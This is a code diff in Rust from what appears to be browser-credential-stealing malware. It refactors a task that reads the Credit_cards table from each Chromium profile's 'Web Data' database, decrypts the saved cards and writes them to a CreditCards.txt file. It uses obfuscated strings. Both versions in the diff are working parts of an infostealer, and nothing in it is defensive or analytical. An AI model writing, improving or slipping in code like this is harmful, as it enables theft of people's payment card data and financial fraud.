@@ -1,8 +1,7 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::{decrypt_data, BrowserData};
-use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, CreditCard};
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, CreditCard};
 use alloc::sync::Arc;
-use alloc::vec::Vec;
 use database::TableRecord;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
@@ -28,9 +27,11 @@ impl Task for CreditCardsTask {
     parent_name!("CreditCards.txt");
     
     unsafe fn run(&self, parent: &Path) {
-        let Some(mut credit_cards) = collect_from_all_profiles(
+        let Some(mut credit_cards) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
-            |profile| read_credit_cards(profile, &self.browser)
+            |profile| profile / s!("Web Data"),
+            s!("Credit_cards"),
+            |record| extract_card_from_record(record, &self.browser)
         ) else {
             return
         };
@@ -39,16 +40,6 @@ impl Task for CreditCardsTask {
         
         let _ = to_string_and_write_all(&credit_cards, "\n\n", parent);
     }
-}
-
-fn read_credit_cards(profile: &Path, browser_data: &BrowserData) -> Option<Vec<CreditCard>> {
-    let web_data_path = profile / s!("Web Data");
-    
-    read_sqlite3_and_map_records(
-        &web_data_path,
-        s!("Credit_cards"),
-        |record| extract_card_from_record(record, browser_data)
-    )
 }
 
 fn extract_card_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<CreditCard> {
